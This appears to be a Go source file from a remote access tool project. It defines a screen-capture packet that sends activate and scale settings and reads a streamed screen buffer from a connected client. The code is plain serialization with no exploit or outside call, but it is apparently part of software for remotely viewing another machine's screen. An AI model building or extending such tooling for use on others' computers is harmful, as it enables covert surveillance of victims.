package main

import (
	"errors"
	"io"
	"rat/common"
)

type ScreenPacket struct {
	Activate bool
	Scale    float32
}

func (packet ScreenPacket) GetHeader() common.PacketHeader {
	return common.ScreenHeader
}

func (packet ScreenPacket) Write(c *Client) error {
	c.WriteBool(packet.Activate)
	return c.WriteFloat(packet.Scale)
}

func (packet ScreenPacket) Read(c *Client) error {
	len, err := c.ReadInt()

	if err != nil {
		return err
	}

	c.Screen.Buffer = make([]byte, int(len))

	rlen, err := io.ReadFull(c, c.Screen.Buffer)

	if rlen != len {
		return errors.New("EOF")
	}

	if err != nil {
		return err
	}

	return nil
}
